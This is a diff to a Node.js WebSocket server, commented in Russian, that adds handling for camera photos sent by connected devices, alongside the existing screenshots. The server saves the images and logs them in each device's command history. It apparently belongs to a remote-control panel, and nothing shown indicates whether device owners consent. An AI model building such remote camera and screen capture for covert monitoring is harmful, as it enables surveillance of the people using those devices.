@@ -118,6 +118,7 @@ wss.on('connection', (ws, req) => {
                 return;
             }
 
+            // Скриншот
             if (data.type === 'screenshot') {
                 if (deviceCode && data.image) {
                     const timestamp = Date.now();
@@ -140,6 +141,25 @@ wss.on('connection', (ws, req) => {
                     });
                     commandsHistory[deviceCode].push({ command: 'screenshot', time: timestamp, result: `/screenshots/${filename}` });
                     ws.send(JSON.stringify({ type: 'ack', command: 'screenshot', status: 'ok' }));
+                    broadcastDevices();
+                }
+                return;
+            }
+
+            // Фото с камеры
+            if (data.type === 'camera_photo') {
+                if (deviceCode && data.image) {
+                    const timestamp = Date.now();
+                    let ext = 'jpg';
+                    let base64Data = data.image.replace(/^data:image\/jpeg;base64,/, '');
+                    const filename = `camera_${deviceCode}_${timestamp}.${ext}`;
+                    const filepath = path.join(__dirname, 'public/screenshots', filename);
+                    fs.writeFile(filepath, base64Data, 'base64', (err) => {
+                        if (err) console.error('❌ Ошибка записи фото:', err);
+                        else console.log(`📸 Фото сохранено: ${filename}`);
+                    });
+                    commandsHistory[deviceCode].push({ command: 'camera', time: timestamp, result: `/screenshots/${filename}` });
+                    ws.send(JSON.stringify({ type: 'ack', command: 'camera', status: 'ok' }));
                     broadcastDevices();
                 }
                 return;
